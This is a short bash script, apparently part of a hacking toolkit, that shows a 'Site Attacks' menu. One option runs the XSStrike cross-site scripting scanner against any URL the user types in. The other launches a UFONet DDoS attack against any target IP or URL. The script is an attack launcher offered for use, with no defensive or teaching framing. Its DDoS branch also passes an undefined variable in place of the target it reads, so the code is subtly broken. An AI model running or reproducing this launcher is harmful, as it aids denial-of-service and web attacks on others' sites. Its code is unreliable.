cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

figlet "Site" 
figlet "Attacks" 
figlet "Menu" 

echo -e $green"========================"
echo -e $yel"1)XSS/CSRF"
echo -e $yel"2)DDoS/Web Abuse"
echo -e $yel"3)Exit"
echo -e $green"========================"

read -p " [<Attacks>] " attacks

if [ $attacks = "1" ] 
then
clear
figlet "XSS"
figlet "CSRF" 

read -p " [>Target-Url<] " target1 
cd $HOME/NobodysLand/XSStrike
python3 xsstrike.py -u $target1 
fi

if [ $attacks = "2" ]
then
clear
figlet "DDoS" 
read -p " [<Target-Ip/URL>] " target2 
echo -e $red"[+]Starting..."

cd $HOME/NobodysLand/ufonet
./ufonet -a $target --spray 200 
fi

